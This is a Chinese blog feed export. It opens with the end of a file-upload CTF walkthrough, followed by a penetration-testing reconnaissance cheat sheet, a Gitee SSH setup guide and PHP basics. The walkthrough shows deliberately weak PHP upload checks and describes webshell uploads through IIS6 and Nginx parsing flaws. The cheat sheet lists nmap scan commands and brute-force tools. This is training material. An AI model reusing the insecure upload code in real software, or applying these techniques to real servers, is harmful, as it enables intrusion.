<span class="keyword">echo</span> <span class="string">"上传文件名: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件类型: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] . <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件大小: "</span> . ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>) . <span class="string">" kB"</span>;</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="string">"./b/image/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" 文件已经存在。 "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span></span><br><span class="line">            $ret = move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="string">"image/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"文件存储在: "</span> . <span class="string">"./b/image/"</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">	    <span class="keyword">echo</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"非法的文件格式"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li>白名单机制不影响;来截断进行getshell</li>
</ul>
</blockquote>
<h1 id="pass-22"><a href="#pass-22" class="headerlink" title="pass-22"></a>pass-22</h1><blockquote>
<ul>
<li>直接上传一个图片，解析</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723110211328.png" alt="image-20210723110211328"></p>
<h1 id="pass-23"><a href="#pass-23" class="headerlink" title="pass-23"></a>pass-23</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">$allowedExts = <span class="keyword">array</span>(<span class="string">"jpg"</span>);</span><br><span class="line">$time = time();</span><br><span class="line">$temp = explode(<span class="string">"."</span>, $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>]);</span><br><span class="line"><span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>];</span><br><span class="line">$extension = end($temp);     <span class="comment">// 获取文件后缀名</span></span><br><span class="line"><span class="keyword">if</span> ((($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/x-png"</span>)</span><br><span class="line">|| ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">&amp;&amp; ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>)   <span class="comment">// 小于 200 kb</span></span><br><span class="line">&amp;&amp; in_array($extension, $allowedExts))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"错误：: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] . <span class="string">""</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"上传文件名: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件类型: "</span> . $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>] . <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"文件大小: "</span> . ($_FILES[<span class="string">"file"</span>][<span class="string">"size"</span>] / <span class="number">1024</span>) . <span class="string">" kB"</span>;</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="string">"C:/Inetpub/wwwroot/c/image/a.asp/"</span> .$time.<span class="string">".jpg"</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>] . <span class="string">" 文件已经存在。 "</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 如果 upload 目录不存在该文件则将文件上传到 upload 目录下</span></span><br><span class="line">            $ret = move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], <span class="string">"image/a.asp/"</span>.$time.<span class="string">".jpg"</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"文件存储在: "</span> . <span class="string">"./c/image/a.asp/"</span>.$time.<span class="string">".jpg"</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"非法的文件格式"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<ul>
<li><strong>这题主要是教我们一个姿势，帮我们定好了文件名，上传一个包含asp一句话木马的图片</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723111848603.png" alt="image-20210723111848603"></p>
<blockquote>
<ul>
<li><strong>由此可以看出文件名中若是带有后缀asp的也可以在iis6.0中解析</strong></li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723111907829.png" alt="image-20210723111907829"></p>
<h1 id="pass-24"><a href="#pass-24" class="headerlink" title="pass-24"></a>pass-24</h1><blockquote>
<ul>
<li><strong>本题考查的是cgi解析漏洞：</strong><br><strong>Nginx在图片中嵌入PHP代码然后通过访问</strong><br>*<em>xxx.jpg/1.php *</em>来执行其中的代码，上传一个图片马php</li>
</ul>
</blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723112427410.png" alt="image-20210723112427410"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723112448518.png" alt="image-20210723112448518"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210723112502513.png" alt="image-20210723112502513"></p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>封神台</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>【渗透测试】信息收集-备忘单</title>
    <url>/posts/64.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><blockquote>
<ul>
<li><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><ul>
<li><strong>御剑目录扫描</strong></li>
<li><strong>kali dirbuster</strong></li>
</ul>
</li>
<li><h2 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h2><ul>
<li><p><a href="https://github.com/euphrat1ca/LayerDomainFinder" target="_blank" rel="noopener">Layer子域名挖掘机</a></p>
</li>
<li><p><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">subDomainsBrute</a></p>
</li>
</ul>
</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">python2 subDomainsBrute.py qq.com -f subnames_full.txt -o qq.com.csv</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong>常用的子域名工具如下（Github都可搜到）</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">OneForAll</span><br><span class="line">Layer</span><br><span class="line">Sublist3r</span><br><span class="line">subDomainsBrute</span><br><span class="line">K8</span><br><span class="line">wydomain</span><br><span class="line">dnsmaper</span><br><span class="line">dnsbrute</span><br><span class="line">Findomain</span><br><span class="line">fierce等</span><br></pre></td></tr></table></figure></div>

<ul>
<li><h2 id="whois信息-ip反查-邮件反查-资产相关"><a href="#whois信息-ip反查-邮件反查-资产相关" class="headerlink" title="whois信息/ip反查/邮件反查/资产相关"></a>whois信息/ip反查/邮件反查/资产相关</h2><ul>
<li><strong>kali whois</strong></li>
<li><a href="http://tool.chinaz.com/" target="_blank" rel="noopener">站长工具</a></li>
<li><a href="https://www.webscan.cc/" target="_blank" rel="noopener">C记录查询</a></li>
<li><a href="https://ping.chinaz.com/" target="_blank" rel="noopener">查是否用了CDN</a></li>
<li><a href="https://www.tianyancha.com/" target="_blank" rel="noopener">天眼查</a></li>
</ul>
</li>
<li><h2 id="端口服务"><a href="#端口服务" class="headerlink" title="端口服务"></a>端口服务</h2><ul>
<li>使用nmap查询这个端口对应的服务</li>
</ul>
</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">nmap -p0-65535 192.168.43.69 -A &#x2F;&#x2F;扫描0-65535端口并返回info</span><br><span class="line">nmap -v -A -F -iL target.txt -oX target_f.xml &#x2F;&#x2F;批量扫描</span><br></pre></td></tr></table></figure></div>

<ul>
<li><h2 id="web-信息探测"><a href="#web-信息探测" class="headerlink" title="web 信息探测"></a>web 信息探测</h2><ul>
<li><p><a href="https://www.yunsee.cn/" target="_blank" rel="noopener">云悉指纹识别</a></p>
</li>
<li><p><a href="http://finger.tidesec.net/" target="_blank" rel="noopener">TideFinger</a></p>
</li>
<li><p><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">BugScaner</a></p>
</li>
<li><p><a href="https://fp.shuziguanxing.com/#/" target="_blank" rel="noopener">数字观星</a></p>
</li>
<li><p><a href="https://www.whatweb.net/" target="_blank" rel="noopener">whatweb</a></p>
</li>
<li><p><strong>Github项目</strong></p>
</li>
</ul>
</li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">CMSeeK</span><br><span class="line">CMSmap</span><br><span class="line">ACMSDiscovery</span><br><span class="line">TideFinger</span><br><span class="line">AngelSword</span><br></pre></td></tr></table></figure></div>

<ul>
<li><h2 id="邮件收集-theHarvester"><a href="#邮件收集-theHarvester" class="headerlink" title="邮件收集 theHarvester"></a>邮件收集 <a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">theHarvester</a></h2></li>
<li><h2 id="穷举爆破神器-hydra"><a href="#穷举爆破神器-hydra" class="headerlink" title="穷举爆破神器 hydra"></a>穷举爆破神器 hydra</h2></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>黑客工具</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>备忘录</tag>
      </tags>
  </entry>
  <entry>
    <title>【GITHUB】Github上传本地项目</title>
    <url>/posts/81.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Github简介"><a href="#Github简介" class="headerlink" title="Github简介"></a>Github简介</h1><blockquote>
<p><strong>GitHub是基于git实现的代码托管。git是目前最好用的版本控制系统了，非常受欢迎，比之svn更好。</strong></p>
<p><strong>GitHub可以免费使用，并且快速稳定。即使是付费帐户，每个月不超过10美刀的费用也非常便宜。</strong></p>
<p><strong>利用GitHub，你可以将项目存档，与其他人分享交流，并让其他开发者帮助你一起完成这个项目。优点在于，他支持多人共同完成一个项目，因此你们可以在同一页面对话交流。</strong></p>
<p><strong>创建自己的项目，并备份，代码不需要保存在本地或者服务器，GitHub做得非常理想。</strong></p>
</blockquote>
<h1 id="Gitee和Github区别"><a href="#Gitee和Github区别" class="headerlink" title="Gitee和Github区别"></a>Gitee和Github区别</h1><blockquote>
<ul>
<li><strong>Gitee是中国大陆的所以访问不会出现问题，本次环境使用gitee，两者没有任何区别，也就是访问速度问题。</strong></li>
</ul>
</blockquote>
<h1 id="Gitee新建仓库"><a href="#Gitee新建仓库" class="headerlink" title="Gitee新建仓库"></a>Gitee新建仓库</h1><blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210719155252502.png" alt="image-20210719155252502"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210719155553524.png" alt="image-20210719155553524"></p>
</blockquote>
<h1 id="Gitee账户设置SSH-key"><a href="#Gitee账户设置SSH-key" class="headerlink" title="Gitee账户设置SSH key"></a>Gitee账户设置SSH key</h1><blockquote>
<p><strong>众所周知ssh key是加密传输。</strong></p>
<p><strong>加密传输的算法有好多，git使用rsa，rsa要解决的一个核心问题是，如何使用一对特定的数字，使其中一个数字可以用来加密，而另外一个数字可以用来解密。这两个数字就是你在使用git和github的时候所遇到的public key也就是公钥以及private key私钥。</strong></p>
<p><strong>其中，公钥就是那个用来加密的数字，这也就是为什么你在本机生成了公钥之后，要上传到github的原因。从github发回来的，用那公钥加密过的数据，可以用你本地的私钥来还原。</strong></p>
<p><strong>如果你的key丢失了，不管是公钥还是私钥，丢失一个都不能用了，解决方法也很简单，重新再生成一次，然后在github.com里再设置一次就行</strong></p>
</blockquote>
<h2 id="生成ssh-key"><a href="#生成ssh-key" class="headerlink" title="生成ssh key"></a>生成ssh key</h2><blockquote>
<ul>
<li><strong>首先检测是否已生成密钥，ls如果有3个文件，则密钥已经生成</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210719155833254.png" alt="image-20210719155833254"></p>
<ul>
<li><strong>如果没有生成，那么通过命令生成，直接回车键，这里不使用密码进行登录，用密码太麻烦</strong></li>
</ul>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C “2324298849@qq.com&quot;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>去目录里面打开刚刚<strong>生成</strong>的<strong>id_rsa.pub</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210719160347205.png" alt="image-20210719160347205"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210719160425963.png" alt="image-20210719160425963"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210719160516332.png" alt="image-20210719160516332"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210719160524961.png" alt="image-20210719160524961"></p>
</blockquote>
<h1 id="Gitee上传本地项目"><a href="#Gitee上传本地项目" class="headerlink" title="Gitee上传本地项目"></a>Gitee上传本地项目</h1><blockquote>
<ul>
<li><strong>接着到你的项目地址上面，按着教程顺着打一遍</strong></li>
</ul>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210719160711811.png" alt="image-20210719160711811"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210719160740555.png" alt="image-20210719160740555"></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210719160856828.png" alt="image-20210719160856828"></p>
</blockquote>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-github-io"><a href="#孤桜懶契：http-gylq-github-io" class="headerlink" title="孤桜懶契：http://gylq.github.io"></a>孤桜懶契：<a href="http://gylq.github.io" target="_blank" rel="noopener">http://gylq.github.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>知识积累</category>
      </categories>
      <tags>
        <tag>成长之路</tag>
        <tag>Git</tag>
      </tags>
  </entry>
  <entry>
    <title>【PHP】基础知识整理</title>
    <url>/posts/82.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="变量基本类型测试代码"><a href="#变量基本类型测试代码" class="headerlink" title="变量基本类型测试代码"></a>变量基本类型测试代码</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//echo "Hello World!";</span></span><br><span class="line">	<span class="comment">#单行注释</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	多行注释</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="comment">//phpinfo();</span></span><br><span class="line">	<span class="comment">//变量的写法</span></span><br><span class="line">	<span class="comment">//$变量名</span></span><br><span class="line">	<span class="comment">//print_r 输出数组</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//$a  = 10; //变量名区分大小写</span></span><br><span class="line">	<span class="comment">//$A = 20;</span></span><br><span class="line">	<span class="comment">//echo isset($a);</span></span><br><span class="line">	<span class="comment">// var_dump(isset($c));</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//gettype返回php类型</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	整型</span></span><br><span class="line"><span class="comment">	浮点型</span></span><br><span class="line"><span class="comment">	字符串</span></span><br><span class="line"><span class="comment">	布尔 bool</span></span><br><span class="line"><span class="comment">	数组 array</span></span><br><span class="line"><span class="comment">	NULL 空对象</span></span><br><span class="line"><span class="comment">	资源 resource</span></span><br><span class="line"><span class="comment">	对象 （面向对象）</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//测试</span></span><br><span class="line">	<span class="comment">//var_dump()是详细输出变量类型</span></span><br><span class="line"></span><br><span class="line">	$a = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">echo</span> (gettype($a));  <span class="comment">//Integer整型</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">' '</span>;</span><br><span class="line">	$a = <span class="number">1.2</span>;</span><br><span class="line">	<span class="keyword">echo</span> (gettype($a));  <span class="comment">//double</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">' '</span>;</span><br><span class="line">	$a = <span class="string">"51"</span>;</span><br><span class="line">	<span class="keyword">echo</span> (gettype($a));  <span class="comment">//string</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">' '</span>;</span><br><span class="line">	$a = <span class="keyword">false</span>;</span><br><span class="line">	<span class="keyword">echo</span> (gettype($a));  <span class="comment">//boolean</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">' '</span>;</span><br><span class="line">	$a = <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="string">"baidu"</span>,<span class="number">2.1</span>);<span class="comment">//索引数组</span></span><br><span class="line">	<span class="keyword">echo</span> (gettype($a));  <span class="comment">//array分为两种类型、索引数组、关联数组</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">' '</span>;</span><br><span class="line">	$a = <span class="keyword">NULL</span>;</span><br><span class="line">	<span class="keyword">echo</span> (gettype($a));  <span class="comment">//NULL类型</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">' '</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="运算符测试代码"><a href="#运算符测试代码" class="headerlink" title="运算符测试代码"></a>运算符测试代码</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$num1 = <span class="number">10</span>;</span><br><span class="line">	$num2 = <span class="number">20</span>; <span class="comment">//除数不能为零</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//加减乘除</span></span><br><span class="line">	$a1 = $num1 + $num2;</span><br><span class="line">	$a2 = $num1 - $num2;</span><br><span class="line">	$a3 = $num1 * $num2;</span><br><span class="line">	$a4 = $num1 / $num2;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> $a1;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> $a2;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> $a3;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> $a4;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	$a1 = <span class="number">9</span>;</span><br><span class="line">	$a2 = <span class="number">4</span>;</span><br><span class="line">	$a3 = $a1 % $a2; <span class="comment">//取余</span></span><br><span class="line">	<span class="keyword">echo</span> $a3;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ++ --</span></span><br><span class="line">	<span class="comment">//前++</span></span><br><span class="line">	<span class="comment">//后++</span></span><br><span class="line">	<span class="comment">//前--</span></span><br><span class="line">	<span class="comment">//后--</span></span><br><span class="line">	$a = <span class="number">10</span>;</span><br><span class="line">	<span class="keyword">echo</span> $a++;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> $a;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="keyword">echo</span> ++$a;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//比较运算符</span></span><br><span class="line">	<span class="comment">//&gt; &gt;= &lt; &lt;= != == === !==</span></span><br><span class="line">	<span class="comment">//返回值boolean</span></span><br><span class="line">	</span><br><span class="line">	$a = <span class="number">10</span>;</span><br><span class="line">	$b = <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	var_dump($a!=$b); <span class="comment">//true</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	$a = <span class="string">"10"</span>; <span class="comment">//string</span></span><br><span class="line">	$b = <span class="number">10</span>;   <span class="comment">//integer</span></span><br><span class="line">	var_dump($a!==$b); <span class="comment">//false</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//三元运算符 ? : </span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	$a = <span class="number">20</span>;</span><br><span class="line">	$b = <span class="number">10</span>;</span><br><span class="line">	<span class="keyword">echo</span> $a&gt;$b?<span class="string">"Hellow"</span>:<span class="string">"Go"</span>; <span class="comment">//输出Hellow</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//&amp;&amp; || ! 与或非</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	$a = <span class="keyword">false</span>;</span><br><span class="line">	$b = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">	var_dump(!$b);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//字符串运算符.</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	$a = <span class="string">"gylq."</span>;</span><br><span class="line">	$b = <span class="string">"github.io"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">echo</span> $a.$b; <span class="comment">//.起连接作用</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<h1 id="控制结构测试"><a href="#控制结构测试" class="headerlink" title="控制结构测试"></a>控制结构测试</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">	$a = <span class="number">30</span>;</span><br><span class="line">	$b = <span class="number">20</span>;</span><br><span class="line"><span class="comment">//php控制结构</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//if - else</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// if ($a &gt; 5) &#123;</span></span><br><span class="line"><span class="comment">// 	// code...</span></span><br><span class="line"><span class="comment">// 	echo $a;</span></span><br><span class="line"><span class="comment">// &#125;else&#123;</span></span><br><span class="line"><span class="comment">// 	echo "xxx";</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// echo "&lt;hr/&gt;"  //下划线</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// switch</span></span><br><span class="line"><span class="comment">// 整型、字符串</span></span><br><span class="line"><span class="comment">// switch ($a) &#123;</span></span><br><span class="line"><span class="comment">// 	case 1:</span></span><br><span class="line"><span class="comment">// 		echo "a=1";</span></span><br><span class="line"><span class="comment">// 		break;</span></span><br><span class="line"><span class="comment">// 	case 2:</span></span><br><span class="line"><span class="comment">// 		echo "a=2";</span></span><br><span class="line"><span class="comment">// 		break;</span></span><br><span class="line"><span class="comment">// 	case 3:</span></span><br><span class="line"><span class="comment">// 		echo "a=3";</span></span><br><span class="line"><span class="comment">// 		break;</span></span><br><span class="line"><span class="comment">// 	default:</span></span><br><span class="line"><span class="comment">// 		echo "a=?";</span></span><br><span class="line"><span class="comment">// 		break;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//循环结构</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//while</span></span><br><span class="line">	<span class="comment">// while ($a &lt; $b) &#123;</span></span><br><span class="line">	<span class="comment">// 	// code...</span></span><br><span class="line">	<span class="comment">// 	echo "a=$a,b=$b"."&lt;br/&gt;";</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 	$a++;</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// for ($i=0; $i &lt; 10; $i++) &#123; </span></span><br><span class="line">	<span class="comment">// 	// code...</span></span><br><span class="line">	<span class="comment">// 	echo $i."&lt;br/&gt;";</span></span><br><span class="line">	<span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//do-while</span></span><br><span class="line">	<span class="comment">// do &#123;</span></span><br><span class="line">	<span class="comment">// 	// code...</span></span><br><span class="line">	<span class="comment">// 	echo "a=$a,b=$b"."&lt;br/&gt;";</span></span><br><span class="line">	<span class="comment">// 	$a--;</span></span><br><span class="line">	<span class="comment">// &#125; while ($a &gt; $b);</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> ($i=<span class="number">1</span>; $i &lt; <span class="number">10</span>; $i++) &#123; </span><br><span class="line">		<span class="comment">// code...</span></span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>($i == <span class="number">5</span>)</span><br><span class="line">			<span class="keyword">continue</span>;  <span class="comment">//break是跳出整个循环，continue是跳出本次循环</span></span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"i=$i&lt;br/&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

